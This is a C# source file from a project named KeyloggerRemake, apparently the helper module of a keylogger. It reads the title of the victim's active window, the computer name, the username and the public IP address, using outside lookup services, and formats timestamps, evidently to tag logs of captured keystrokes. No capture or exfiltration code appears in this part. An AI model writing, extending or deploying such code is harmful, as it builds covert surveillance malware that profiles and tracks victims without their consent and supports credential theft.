using System;
using System.Windows.Forms;
using System.Text;
using System.Net;
using System.Runtime.InteropServices;

namespace KeyloggerRemake
{
    static class classGetUserInfo
    {
        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();
        [DllImport("user32.dll")]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        public static String strCurrentWindow = "";

        public static String getActiveWindowTitle()
        {
            const int nChars = 256;
            StringBuilder Buff = new StringBuilder(nChars);
            IntPtr handle = GetForegroundWindow();

            if (GetWindowText(handle, Buff, nChars) > 0)
            {
                return Buff.ToString();
            }
            return null;
        }

        public static String getUserInfo()
        {
            String info = Environment.NewLine + "Computer Name:" + " " + Environment.MachineName + Environment.NewLine
                 + "Username:" + " " + Environment.UserName + Environment.NewLine
                 + "IP: " + getIPAddress();

            return info;
        }

        public static String getIPAddress()
        {
            String strIP = "";

            String ipAPI1 = "https://api.ipify.org/";
            String ipAPI2 = "https://ip.seeip.org/";
            String ipAPI3 = "https://api.ip.sb/ip";

            using (WebClient wc = new WebClient())
            {
                try
                {
                    strIP = System.Text.Encoding.UTF8.GetString(wc.DownloadData(ipAPI1));
                }
                catch (WebException WE)
                {
                    strIP = System.Text.Encoding.UTF8.GetString(wc.DownloadData(ipAPI2));
                }
                catch (Exception WE2)
                {
                    strIP = System.Text.Encoding.UTF8.GetString(wc.DownloadData(ipAPI3));
                }
            }

            return strIP;
        }

        public static String getDateAndTime()
        {
            return (DateTime.Now.DayOfWeek.ToString() + ", " + DateTime.Now.ToLongDateString() + " "
                + DateTime.Now.ToLongTimeString() + " ");
        }

        public static String getShortDTime()
        {
            return (DateTime.Now.ToShortDateString() + " "
                + DateTime.Now.ToShortTimeString()).Replace(":", "-").Replace("/", "-");
        }
    }
}
